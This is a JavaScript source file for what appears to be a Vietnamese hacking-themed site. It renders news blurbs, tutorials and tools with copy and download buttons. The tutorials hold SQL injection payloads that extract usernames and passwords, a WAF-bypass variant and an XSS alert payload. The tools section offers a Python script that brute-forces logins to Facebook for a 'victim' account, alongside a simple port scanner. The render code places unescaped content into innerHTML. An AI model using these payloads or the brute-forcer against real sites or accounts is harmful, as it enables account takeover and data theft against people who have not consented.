// ================== POSTS DATA ==================
const posts = {
  news: [
    {
      title: "Zero-Day mới trên Windows",
      content: "Một lỗ hổng zero-day vừa được công bố, cho phép attacker leo thang đặc quyền thông qua dịch vụ Print Spooler.",
      link: "https://thehackernews.com/"
    },
    {
      title: "Anonymous tấn công chính phủ",
      content: "Nhóm hacker Anonymous đã công bố dữ liệu từ nhiều website chính phủ sau chiến dịch tấn công DDoS.",
      link: "https://www.reuters.com/"
    }
  ],

  tutorials: [
    {
      title: "SQL Injection cơ bản",
      content: `Hướng dẫn cách khai thác SQL Injection trên các ứng dụng web không an toàn.`,
      code: `# SQLi Test Payload
' OR '1'='1
' UNION SELECT null, username, password FROM users --`
    },
    {
      title: "Bypass WAF cơ bản",
      content: "Cách vượt qua một số Web Application Firewall phổ biến bằng cách encode payload.",
      code: `# WAF Bypass Payload
admin'/**/OR/**/'1'='1
<script>alert(1)</script>`
    }
  ],

  tools: [
    {
      title: "Brute Force Facebook",
      content: "Tool Python brute-force login Facebook (dùng cho mục đích nghiên cứu).",
      code: `import requests

url = "https://facebook.com/login"
for pwd in ["123456", "password", "letmein"]:
    r = requests.post(url, data={"email":"victim","pass":pwd})
    if "Welcome" in r.text:
        print("Found password:", pwd)
        break`,
      filename: "fb_bruteforce.py"
    },
    {
      title: "Port Scanner",
      content: "Tool scan port đơn giản với Python.",
      code: `import socket

target = "127.0.0.1"
for port in range(1,1000):
    s = socket.socket()
    s.settimeout(0.5)
    try:
        s.connect((target, port))
        print("Port open:", port)
    except:
        pass`,
      filename: "port_scanner.py"
    }
  ]
};

// ================== RENDER POSTS ==================
function renderPosts() {
  // News
  const newsContainer = document.getElementById("news");
  posts.news.forEach(post => {
    newsContainer.innerHTML += `
      <div class="card">
        <h2>📡 ${post.title}</h2>
        <p>${post.content}</p>
        <a href="${post.link}" target="_blank">
          <button class="btn read-btn">🔗 Read More</button>
        </a>
      </div>`;
  });

  // Tutorials
  const tutContainer = document.getElementById("tutorials");
  posts.tutorials.forEach(post => {
    tutContainer.innerHTML += `
      <div class="card">
        <h2>💻 ${post.title}</h2>
        <p>${post.content}</p>
        <pre><code>${post.code}</code></pre>
        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
      </div>`;
  });

  // Tools
  const toolContainer = document.getElementById("tools");
  posts.tools.forEach(post => {
    toolContainer.innerHTML += `
      <div class="card">
        <h2>🛠 ${post.title}</h2>
        <p>${post.content}</p>
        <pre><code>${post.code}</code></pre>
        <button class="btn copy-btn" onclick="copyCode(\`${post.code}\`)">📋 Copy</button>
        <button class="btn download-btn" onclick="downloadCode(\`${post.code}\`, '${post.filename}')">⬇ Download</button>
      </div>`;
  });
}

// ================== FUNCTIONS ==================
function copyCode(code) {
  navigator.clipboard.writeText(code).then(() => {
    alert("✅ Code copied to clipboard!");
  });
}

function downloadCode(code, filename) {
  const blob = new Blob([code], { type: "text/plain" });
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
  URL.revokeObjectURL(link.href);
}

// Run
document.addEventListener("DOMContentLoaded", renderPosts);
